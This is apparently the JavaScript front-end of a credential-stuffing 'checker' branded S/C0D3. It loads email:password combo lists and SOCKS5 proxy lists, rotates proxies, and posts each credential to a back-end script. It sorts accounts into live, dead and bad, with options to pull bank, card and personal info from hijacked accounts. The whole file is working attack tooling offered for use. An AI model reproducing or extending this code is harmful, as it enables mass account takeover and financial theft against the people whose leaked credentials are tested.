		var ajaxCall;

		Array.prototype.remove = function(value){
			var index = this.indexOf(value);
			if(index != -1){
				this.splice(index, 1);
			}
			return this;
		};
		function enableTextArea(bool){
			$('#socks').attr('disabled', bool);
			$('#mailpass').attr('disabled', bool);
		}
		function gbrn_liveUp(){
			var count = parseInt($('#acc_live_count').html());
			count++;
			$('#acc_live_count').html(count+'');
		}
		function gbrn_dieUp(){
			var count = parseInt($('#acc_die_count').html());
			count++;
			$('#acc_die_count').html(count+'');
		}
		function gbrn_wrongUp(){
			var count = parseInt($('#wrong_count').html());
			count++;
			$('#wrong_count').html(count+'');
		}
		function gbrn_badUp(){
			var count = parseInt($('#bad_count').html());
			count++;
			$('#bad_count').html(count+'');
		}

		function stopLoading(bool){
			$('#loading').attr('src', 'img/clear.gif');
			var str = $('#checkStatus').html();
			$('#checkStatus').html(str.replace('',''));
			enableTextArea(false);
			$('#submit').attr('disabled', false);
			$('#stop').attr('disabled', true);
			if(bool){
				swal({
			title: "Checking Complete",
			timer: 4000,
			type: "success",
			allowEscapeKey: true,
			allowOutsideClick: true,
			text: "Thanks For Using <a href='' target='blank'><b>S/C0D3</b></a> Checker !",
			html: true,
			confirmButtonText: "Continue"
        			});
			}else{
				ajaxCall.abort();
			}
			updateTitle('STOPPED - S/C0D3');
		}
		function updateTitle(str){
			document.title = str;
		}
		function updateTextBox(mp, sock){
			var mailpass = $('#mailpass').val().split("\n");
			var socks = $('#socks').val().split("\n");
			mailpass.remove(mp);
			socks.remove(sock);
			$('#socks').val(socks.join("\n"));
			$('#mailpass').val(mailpass.join("\n"));
		}
		function GbrnTmfn(lstMP, lstSock, curMP, curSock, delim, cEmail, bank, card, info, maxFail, failed, no){
			
			if(lstMP.length<1 || lstSock.length<1 || curMP>=lstMP.length || curSock>=lstSock.length){
				stopLoading(true);
				return false;
			}
			if(failed>=maxFail){
				curSock++;
				GbrnTmfn(lstMP, lstSock, curMP, curSock, delim, cEmail, bank, card, info, maxFail, 0, no);
				return false;
			}
			updateTextBox(lstMP[curMP], lstSock[curSock]);
			
			ajaxCall = $.ajax({
				url: 'check.php',
				dataType: 'json',
				cache: false,
				type: 'POST',
				beforeSend: function (e) {
					updateTitle('['+no+'/'+lstMP.length+'] S/C0D3 - 2k17');
					$('#empas').html('<font style=color:red;><b>Checking</b></font> => '+ lstMP[curMP] +' <font style=color:blue;><b>Sock5</b></font> => '+lstSock[curSock]).effect("highlight", {color:'#B0C4DE'}, 1000);
					$('#loading').attr('src', 'img/loading.gif'); 
				},
				data: 'ajax=1&do=check&sock='+encodeURIComponent(lstSock[curSock])+'&mailpass='+encodeURIComponent(lstMP[curMP])
						+'&delim='+encodeURIComponent(delim)+'&email='+cEmail+'&bank='+bank+'&card='+card+'&info='+info,
				success: function(data) {
					switch(data.error){
						case -1:
							curMP++;
							no++;
							$('#wrong').append(data.msg+'<br />');
							gbrn_wrongUp();
							break;
						case 1:
						case 3:
							curSock++;
							$('#acc_bad').append(data.msg+'<br />');
							gbrn_badUp();
							break;
						case 2:
							curMP++;
							no++;
							$('#acc_die').append(data.msg+'<br />');
							failed++;
							gbrn_dieUp();
							break;
						case 0:
							curMP++;
							no++;
							$('#acc_live').append(data.msg+'<br />');
							gbrn_liveUp();
							break;
					}
					
					GbrnTmfn(lstMP, lstSock, curMP, curSock, delim, cEmail, bank, card, info, maxFail, failed, no);
				}
			});
			return true;
		}
		function filterMP(mp, delim){
			var mps = mp.split("\n");
			var filtered = new Array();
			var lstMP = new Array();
			for(var i=0;i<mps.length;i++){
				if(mps[i].indexOf('@')!=-1){
					var infoMP = mps[i].split(delim);
					for(var k=0;k<infoMP.length;k++){
						if(infoMP[k].indexOf('@')!=-1){
							var email = $.trim(infoMP[k]);
							var pwd = $.trim(infoMP[k+1]);
							if(filtered.indexOf(email.toLowerCase())==-1){
								filtered.push(email.toLowerCase());
								lstMP.push(email+'|'+pwd);
								break;
							}
						}
					}
				}
			}
			return lstMP;
		}
		function resetResult() {
			$('#acc_die,#wrong,#acc_bad').html('');
			$('#acc_die_count,#wrong_count,#bad_count').text(0);
		}
		$(document).ready(function(){
			$(".import-sock").click(function() {
        		$.ajax({
            		url: "socks.php",
            		dataType: "json",
            		type: "POST",
            		beforeSend: function (e) {
						$(".import-sock").html('Generating Socks5');
					},
            		data: "get_sock=1",
            		success: function(_0x1730x2a) {
                                $(".import-sock").html('Done!');
                		var _0x1730x21 = _0x1730x2a.socks;
                		$("#socks").val(_0x1730x21.replace(/\,/g, "\x0A"));
            		},
            		error: function(_0x1730x2a, _0x1730x38, _0x1730x39) {
                		if (_0x1730x38 == "error") {
                    		alert("Error! Please try again or contact admin");
                		};
            		}
        		});
    		});
			$('#stop').attr('disabled', true).click(function(){
			  stopLoading(false);  
			});
			$('#submit').click(function(){
				var no = 1;
				var delim = $('#delim').val().trim();
				var mailpass = filterMP($('#mailpass').val(), delim);
				var regex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
				var found = $('#socks').val().match(regex);
				var bank = $('#bank').is(':checked') ? 1 : 0;
				var card = $('#card').is(':checked') ? 1 : 0;
				var info = $('#info').is(':checked') ? 1 : 0;
				var cEmail = $('#email').is(':checked') ? 1 : 0;
				var maxFail = parseInt($('#fail').val());
				var failed = 0;
				if(found == null){
				swal({
				title: "Can't Check",
				timer: 4000,
				allowEscapeKey: true,
				allowOutsideClick: true,
				type: "error",
				text: "No Sock5 found!",
				confirmButtonText: "Continue"
				     });
				return false;
				} 
				if($('#mailpass').val().trim()==''){
					swal({
				title: "Can't Check",
				timer: 4000,
				allowEscapeKey: true,
				allowOutsideClick: true,
				type: "error",
				text: "No Mail/Pass found!",
				confirmButtonText: "Continue"
				     });
				return false;
				} 
				$('#socks').val(found.join("\n")).attr('disabled', true);
				$('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
				$('#result').show();
				resetResult();
				$('#submit').attr('disabled', true);
				$('#stop').attr('disabled', false);
				GbrnTmfn(mailpass, found, 0, 0, delim, cEmail, bank, card, info, maxFail, 0, no);
				return false; 
			});
		});